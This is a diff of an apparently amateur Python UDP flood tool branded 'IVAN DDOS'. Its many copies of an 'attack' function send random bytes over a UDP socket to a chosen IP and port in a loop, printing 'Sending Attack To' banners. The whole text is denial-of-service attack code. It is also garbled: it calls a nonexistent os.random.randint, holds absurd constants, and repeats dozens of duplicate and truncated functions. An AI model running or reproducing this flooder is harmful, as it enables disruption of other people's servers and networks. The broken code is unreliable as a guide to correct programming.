@@ -245,7 +245,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -271,33 +271,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -323,278 +297,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Selesai')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -620,225 +323,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1013,7 +498,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1045,7 +530,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1077,7 +562,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1109,7 +594,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1275,7 +760,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1301,33 +786,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1353,7 +812,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1528,7 +1013,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1560,7 +1045,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1592,7 +1077,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1624,7 +1109,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1790,7 +1275,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1816,33 +1301,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -1868,7 +1327,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2043,7 +1528,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2075,7 +1560,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2107,7 +1592,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2139,129 +1624,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2427,7 +1790,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -2453,33 +1816,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
